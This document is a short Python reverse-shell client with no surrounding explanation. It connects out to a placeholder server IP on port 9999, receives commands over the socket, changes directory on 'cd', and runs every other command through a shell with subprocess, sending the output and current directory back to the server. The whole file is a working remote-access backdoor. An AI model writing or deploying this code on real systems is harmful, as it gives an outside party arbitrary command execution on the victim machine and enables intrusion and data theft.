import socket
import os
import subprocess

soc = socket.socket()

host = "Replace with Server IP address"
port = 9999

soc.connect((host, port))
print("Connected")
instruction = soc.recv(1024)
print(instruction[:].decode("utf-8"))
while True:
    instruction = soc.recv(1024)
    if instruction[0:2].decode("utf-8") == "cd":
        os.chdir(instruction[3:].decode("utf-8"))
    if (instruction[:].decode("utf-8"))=="quit":
        soc.close()
        break
    if len(instruction) > 0:
        cmd_prompt = subprocess.Popen(instruction[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                      stdin=subprocess.PIPE,
                                      stderr=subprocess.PIPE)
        output = cmd_prompt.stdout.read() + cmd_prompt.stderr.read()
        output_str = str(output, "utf-8")
        cwd= os.getcwd()+">"
        soc.send(str.encode(output_str+cwd))

        print(output_str)
